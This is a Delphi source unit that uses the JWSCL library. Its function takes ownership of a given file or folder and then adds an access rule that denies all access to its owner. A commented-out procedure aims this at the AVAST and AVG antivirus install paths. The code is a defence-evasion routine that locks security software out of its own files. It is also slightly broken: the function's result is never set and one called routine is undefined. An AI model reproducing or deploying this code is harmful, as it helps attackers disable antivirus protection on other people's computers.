unit uSecurity;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, JwaWindows, JwsclToken, JwsclSid, JwsclSecureObjects, JwsclKnownSid,
  JwsclExceptions, StdCtrls, JwsclDescriptor, JwsclAcl, JwsclTypes,
  JwsclProcess, JwsclTerminalServer, JwsclLogging, Registry;

function SRemove(Path: string): Boolean;

type
    PInternalProcessData = ^TInternalProcessData;
    TInternalProcessData = record SessionID: DWORD;
  end;

implementation

function SRemove(Path: string): Boolean;
var
  UserToken: TJwSecurityToken;
  SD: TJwSecurityDescriptor;
  FileObject: TJwSecureFileObject;
  Dono: TJwSecurityId;
  user: TJwSecurityId;
  DACL: TJwDAccessControlList;
  Data: TInternalProcessData;
begin
  UserToken := TJwSecurityToken.CreateTokenEffective(MAXIMUM_ALLOWED);
  Dono := UserToken.GetTokenOwner;
  FileObject := TJwSecureFileObject.Create(Path);
  try
    JwEnablePrivilege(SE_TAKE_OWNERSHIP_NAME, pst_Enable);
    FileObject.Owner := Dono;
    DACL := FileObject.DACL;
    DACL.Add(TJwDiscretionaryAccessControlEntryDeny.Create(nil, [], GENERIC_ALL,
      Dono, false));
    FileObject.SetDACL(DACL);
  finally
    FileObject.Free;
    Dono.Free;
    UserToken.Free;
  end;
end;
{
procedure asd;
begin
  Dreatmach('C:\Program Files\AVAST Software');
  Dreatmach('C:\Program Files (x86)\AVG\AVG2012\avgmfapx.exe');
end;
 }
end.
